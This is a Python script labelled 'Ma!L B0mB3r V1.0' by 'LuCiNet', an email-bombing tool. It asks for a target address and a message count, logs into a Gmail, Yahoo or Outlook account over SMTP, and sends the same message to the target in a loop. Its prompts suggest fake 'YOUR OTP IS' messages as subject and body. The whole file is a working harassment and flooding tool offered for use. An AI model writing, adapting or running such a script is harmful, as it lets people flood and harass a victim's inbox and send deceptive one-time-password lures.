'''Imports'''
import sys
import smtplib
import time

'''Color Design'''
class colors:
	RedBold = '\033[1;31m'
	GreenBold = '\033[1;32m'
	YellowBold = '\033[1;33m'
	CyanBold = '\033[1;36m'

'''Banner Design'''
def banner():
	print (colors.GreenBold + '''		                                                  
          ,                             .         
        ,              Lu Ci              *,      
       ,**                               **,      
      ,,*****      ,***********,     ,*****,      
         ******* ****************..*******.       
          ,******,*************** *****,,         
            **************************,           
            .*************************,           
              ***********************             
            **.      ..  *. ,       .,,           
            ,*,         ,* .         *.           
            * ,,****.,,,   ,* *****,*..           
               ..*,****,,* ******,.,              
                 , **********,**                  
                 *,, *,,* ** ** **                
                 ,*,.*. * *, ..,*                 
                   *, ...     *,                  
                    ,.*** ,,,**                   
                      **,***,                                                                      
		''')
	print (colors.YellowBold + "[LuCiNet] > Ma!L B0mB3r V1.0\n\n")

class Email_Boomber:

	def __init__(self):
		try:
			print (colors.GreenBold + "	[Running Program]\n")
			time.sleep(1)
			print (colors.CyanBold + "Set Target (anything@any.com)\n")
			self.target = str(input(colors.YellowBold + "[BooM> "))
			print (colors.CyanBold + "\nSet Amount of Mails (1000)\n")
			self.ammount = int(input(colors.YellowBold + "[BooM> "))
		except Exception as ex:
			print (colors.RedBold + f"\nError> {ex}\n")

	def setting_up(self):
		try:
			print (colors.GreenBold + "\n	[Starting Set Up]\n")
			time.sleep(1)
			print (colors.CyanBold + "Set Your E-mail Service (Gmail, Yahoo, Outlook)\n")
			self.service = str(input(colors.YellowBold + "[BooM> "))
			self.port = int(587)

			if self.service == 'Gmail':
				self.service = 'smtp.gmail.com'
			elif self.service == 'Yahoo':
				self.service = 'smtp.mail.yahoo.com'
			elif self.service == 'Outlook':
				self.service = 'smtp-mail.outlook.com'

			print (colors.CyanBold + "\nSet Sender (anything@any.com)\n")
			self.sender = str(input(colors.YellowBold + "[BooM> "))
			print (colors.CyanBold + f"\nPassword for {self.sender}\n")
			self.password = str(input(colors.YellowBold + "[BooM> "))
			print (colors.CyanBold + "\nEnter Subject (YOUR OTP IS ...)\n")
			self.subject = str(input(colors.YellowBold + "[BooM> "))
			print (colors.CyanBold + "\nEnter Message (Hello Sir. Your OTP is 2564)\n")
			self.message = str(input(colors.YellowBold + "[BooM> "))

			self.formated_mail = f'Subject: {self.subject}\n\n{self.message}'

			self.server = smtplib.SMTP(self.service, self.port)
			self.server.starttls()
			self.server.login(self.sender, self.password)
		except Exception as ex:
			print (colors.RedBold + f"\nError> {ex}\n")

	count = 0

	def send_mail(self):
		try:
			self.server.sendmail(self.sender, self.target, self.formated_mail)
			self.count += 1
			time.sleep(15)
		except Exception as ex:
			print (colors.RedBold + f"\nError> {ex}\n")

	def fire(self):
		time.sleep(1)
		print (colors.RedBold + "\n	[Boombing Do Not Close!]\n")
		for email in range(self.ammount):
			self.send_mail()
		print (colors.GreenBold + "\n	[Boombing Completed Successfully]\n")
		time.sleep(0.5)
		print (colors.GreenBold + "\n	[Author: LuCiNet]\n")
		time.sleep(0.5)
		sys.exit(0)

if __name__ == '__main__':
	banner()
	bomber = Email_Boomber()
	bomber.setting_up()
	bomber.fire()
